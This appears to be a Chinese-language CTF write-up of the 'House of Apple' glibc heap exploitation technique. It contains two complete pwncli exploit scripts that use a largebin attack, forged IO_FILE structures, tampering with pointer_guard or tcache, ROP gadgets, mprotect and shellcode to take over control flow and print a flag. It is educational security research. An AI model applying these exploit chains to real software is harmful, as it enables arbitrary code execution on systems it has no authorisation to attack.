
# House of Apple 利用分析

## 准备工作与堆风水布局

在利用之前，还有一些准备工作需要做。我们需要进行合理的堆风水布局，使得能够在修改一个`largebin chunk A`的`bk_nextsize`的同时伪造一个`chunk B`，并需要让`A`和`B`在同一个`bins`数组中，然后释放`B`并进行`largebin attack`，这样就能保证既完成任意地址写堆地址，也能控制写的堆地址所属的`chunk`的内容。

## 参数分析

对三种大小`chunk`的`size`进行分析，并设`x = key + 0x10`，`y = key + 0x20`, `z = key * 2 + 0x10`。那么有：

```
2 * y - z = 2 * key + 0x40 - 2 * key - 0x10 = 0x30
2 * y - 2 * x = 2 *key + 0x40 - 2 * key - 0x20 = 0x20
```

题目中还存在`UAF`，于是就可以的构造出如下布局：

![](upload/attach/202206/956675_6ECD7E3FD4WBJNX.jpg)

## 堆风水步骤

- 释放`chunk 1`，并将其置于`largebin`中
- 利用一次写的机会，修改`chunk 2`，此时修改了`chunk1`的`bk_nextsize`，并伪造一个`chunk 3`
- 释放`chunk 3`，在其入链的过程中触发`largebin attack`，即可任意地址写一个堆地址

经过计算，这里选择`key`为`0xa`，此时`chunk 1`的大小为`0xab0`，伪造的`chunk 3`的大小为`0xa80`。

基于上面对`house of apple`的分析，首先使用思路三修改`pointer_guard`，然后进行`house of emma`利用。由于`pointer_guard`是`fs:[0x30]`，而`canary`是`fs:[0x28]`，所以直接找`canary`，然后利用`pwndbg`的`search`命令搜索即可，如下所示：

![image-20220616003350830](upload/attach/202206/956675_3MDBTS2UM4X22BT.jpg)

## 利用步骤概述

此时的利用步骤如下：

- 利用一次`write`的机会泄露出`libc`地址和`heap`地址
- 利用堆风水，构造`1`次`largebin attack`，替换`_IO_list_all`为堆地址
- 利用`house of apple`，修改掉`pointer_guard`的值
- 利用`house of emma`并结合几个`gadgets`控制`rsp`
- 用`rop`链输出`flag`

其`exp`如下：

```python
#!/usr/bin/python3
# -\*- encoding: utf-8 -\*-
# author: roderick
from pwncli import *
cli_script()
io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']
small = 1
medium = 2
large = 3
key = 10
def add(c):
sla("enter your command: \n", "1")
sla("choise: ", str(c))
def dele(i):
sla("enter your command: \n", "2")
sla("Index: \n", str(i))
def read_once(i, data):
sla("enter your command: \n", "3")
sla("Index: ", str(i))
sa("Message: \n", flat(data, length=0x110 * key))
def write_once(i):
sla("enter your command: \n", "4")
sla("Index: ", str(i))
ru("Message: \n")
m = rn(0x10)
d1 = u64_ex(m[:8])
d2 = u64_ex(m[8:])
log_address_ex("d1")
log_address_ex("d2")
return d1, d2
def bye():
sla("enter your command: \n", "9")
sla("enter your key >>\n", str(key))
add(medium)
add(medium)
add(small)
dele(2)
dele(1)
dele(0)
add(small)
add(small)
add(small)
add(small)
dele(3)
dele(5)
m1, m2 = write_once(3)
libc_base = set_current_libc_base_and_log(m1, 0x1f2cc0)
heap_base = m2 - 0x17f0
dele(4)
dele(6)
add(large)
add(small)
add(small)
dele(8)
add(large)
target_addr = libc.sym._IO_list_all
_IO_wstrn_jumps = libc_base + 0x1f3d20
_IO_cookie_jumps = libc_base + 0x1f3ae0
_lock = libc_base + 0x1f5720
point_guard_addr = libc_base - 0x2890
expected = heap_base + 0x1900
chain = heap_base + 0x1910
magic_gadget = libc_base + 0x146020
mov_rsp_rdx_ret = libc_base + 0x56530
add_rsp_0x20_pop_rbx_ret = libc_base + 0xfd449
pop_rdi_ret = libc_base + 0x2daa2
pop_rsi_ret = libc_base + 0x37c0a
pop_rdx_rbx_ret = libc_base + 0x87729
f1 = IO_FILE_plus_struct()
f1._IO_read_ptr = 0xa81
f1.chain = chain
f1._flags2 = 8
f1._mode = 0
f1._lock = _lock
f1._wide_data = point_guard_addr
f1.vtable = _IO_wstrn_jumps
f2 = IO_FILE_plus_struct()
f2._IO_write_base = 0
f2._IO_write_ptr = 1
f2._lock = _lock
f2._mode = 0
f2._flags2 = 8
f2.vtable = _IO_cookie_jumps + 0x58
data = flat({
0x8: target_addr - 0x20,
0x10: {
0: {
0: bytes(f1),
0x100:{
0: bytes(f2),
0xe0: [chain + 0x100, rol(magic_gadget ^ expected, 0x11)],
0x100: [
add_rsp_0x20_pop_rbx_ret,
chain + 0x100,
0,
0,
mov_rsp_rdx_ret,
0,
pop_rdi_ret,
chain & ~0xfff,
pop_rsi_ret,
0x4000,
pop_rdx_rbx_ret,
7, 0,
libc.sym.mprotect,
chain + 0x200
],
0x200: ShellcodeMall.amd64.cat_flag
}
},
0xa80: [0, 0xab1]
}
})
read_once(5, data)
dele(2)
add(large)
bye()
ia()
ia()
```

调试截图如下：

修改掉`pointer_guard`：

![image-20220616204035757](upload/attach/202206/956675_MW8U6CQNTPZVGE2.jpg)

然后使用`_IO_cookie_read`控制程序执行流：

![image-20220616204134860](upload/attach/202206/956675_QYAQCNH5JV9FG7Q.jpg)

成功劫持`rsp`：

![image-20220616204203067](upload/attach/202206/956675_NNFS86N9XDWJG6K.jpg)

接下来使用思路一，修改`tcache`变量，对于该变量的寻找同样可以使用`search`命令：

![image-20220616204339971](upload/attach/202206/956675_S4MFDNYXS8FPDE4.jpg)

此时的步骤如下：

- 使用`house of apple`修改`tcache`变量为可控堆地址
- 使用`_IO_str_overflow`完成任意地址写任意值，由于`_IO_str_jumps`区域是可写的，所以我选择覆盖这里
- 仍然利用一些`gadgets`劫持`rsp`，然后`rop`泄露出`flag`

`exp`如下：

```python
#!/usr/bin/python3
# -\*- encoding: utf-8 -\*-
# author: roderick
from pwncli import *
cli_script()
io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']
small = 1
medium = 2
large = 3
key = 10
def add(c):
sla("enter your command: \n", "1")
sla("choise: ", str(c))
def dele(i):
sla("enter your command: \n", "2")
sla("Index: \n", str(i))
def read_once(i, data):
sla("enter your command: \n", "3")
sla("Index: ", str(i))
sa("Message: \n", flat(data, length=0x110 * key))
def write_once(i):
sla("enter your command: \n", "4")
sla("Index: ", str(i))
ru("Message: \n")
m = rn(0x10)
d1 = u64_ex(m[:8])
d2 = u64_ex(m[8:])
log_address_ex("d1")
log_address_ex("d2")
return d1, d2
def bye():
sla("enter your command: \n", "9")
sla("enter your key >>\n", str(key))
add(medium) # 0
add(medium) # 1
add(small) # 2 fake
dele(2)
dele(1)
dele(0)
add(small) # 3
add(small) # 4
add(small) # 5 write
add(small) # 6
dele(3)
dele(5)
m1, m2 = write_once(3)
libc_base = set_current_libc_base_and_log(m1, 0x1f2cc0)
heap_base = m2 - 0x17f0
dele(4)
dele(6)
add(large)
add(small) # 8 del
add(small) # gap
dele(8)
add(large)
target_addr = libc.sym._IO_list_all
_IO_wstrn_jumps = libc_base + 0x1f3d20
_IO_str_jumps = libc_base + 0x1f4620
_lock = libc_base + 0x1f5720
tcache = libc_base - 0x2908
tcache_perthread_struct = heap_base + 0x1a10
chain = heap_base + 0x1910
magic_gadget = libc_base + 0x146020
mov_rsp_rdx_ret = libc_base + 0x56530
add_rsp_0x20_pop_rbx_ret = libc_base + 0xfd449
pop_rdi_ret = libc_base + 0x2daa2
pop_rsi_ret = libc_base + 0x37c0a
pop_rdx_rbx_ret = libc_base + 0x87729
f1 = IO_FILE_plus_struct()
f1._IO_read_ptr = 0xa81
f1.chain = chain
f1._flags2 = 8
f1._mode = 0
f1._lock = _lock
f1._wide_data = tcache - 0x38
f1.vtable = _IO_wstrn_jumps
f2 = IO_FILE_plus_struct()
f2.flags = 0
f2._IO_write_base = 0
f2._IO_write_ptr = 0x1000
f2.chain = chain + 0x200
f2._IO_buf_base = chain + 0xf0
f2._IO_buf_end = chain + 0xf0 + 0x20
f2._lock = _lock
f2._mode = 0
f2.vtable = _IO_str_jumps
f3 = IO_FILE_plus_struct()
f3._IO_read_ptr = chain + 0x110
f3._IO_write_base = 0
f3._IO_write_ptr = 1
f3._lock = _lock
f3._mode = 0
f3.vtable = _IO_str_jumps
data = flat({
0x8: target_addr - 0x20,
0x10: {
0: {
0: bytes(f1),
0x100:{
0: bytes(f2),
0xe0: [0, 0x31, [magic_gadget] * 4],
0x110: [
add_rsp_0x20_pop_rbx_ret,
0x21,
0,
0,
mov_rsp_rdx_ret,
0,
pop_rdi_ret,
chain & ~0xfff,
pop_rsi_ret,
0x4000,
pop_rdx_rbx_ret,
7, 0,
libc.sym.mprotect,
chain + 0x300
],
0x1b8: _IO_str_jumps,
0x200: bytes(f3),
0x300: ShellcodeMall.amd64.cat_flag
}
},
0xa80: [0, 0xab1]
}
})
read_once(5, data)
dele(2)
add(large)
bye()
ia()
```

调试截图：

修改掉`tache`变量：

![image-20220616204846469](upload/attach/202206/956675_BV6E4X7RAWU9Q4H.jpg)

然后分配到`_IO_str_jumps`：

![image-20220616205014138](upload/attach/202206/956675_8WGJCQN7YY45UV6.jpg)

后面的过程就一样了：

![image-20220616205139145](upload/attach/202206/956675_33P34CNTZ8GK36H.jpg)

最后成功输出`flag`:

![image-20220616205159794](upload/attach/202206/956675_C9D2GTWT5JUAN88.jpg)

## 总结

之前的一些`IO`流攻击方法对`_wide_data`的关注甚少，本文提出一种新的方法，劫持了`_wide_data`成员并在仅进行`1`次`largebin attack`的条件下成功进行`FSOP`利用。且该方法可通杀所有版本的`glibc`。

可以看到，`house of apple`是对现有一些`IO`流攻击方法的补充，能在一次劫持`IO`流的过程中做到任意地址写已知值，进而构造出其他方法攻击成功的条件。

目录

- [House of apple1](https://bbs.kanxue.com/#house-of-apple1)
- [前言](https://bbs.kanxue.com/#前言)
- [利用条件](https://bbs.kanxue.com/#利用条件)
- [利用原理](https://bbs.kanxue.com/#利用原理)
- [利用思路](https://bbs.kanxue.com/#利用思路)
- [思路一：修改`tcache`线程变量](https://bbs.kanxue.com/#思路一：修改tcache线程变量)
- [思路二：修改`mp_`结构体](https://bbs.kanxue.com/#思路二：修改mp_结构体)
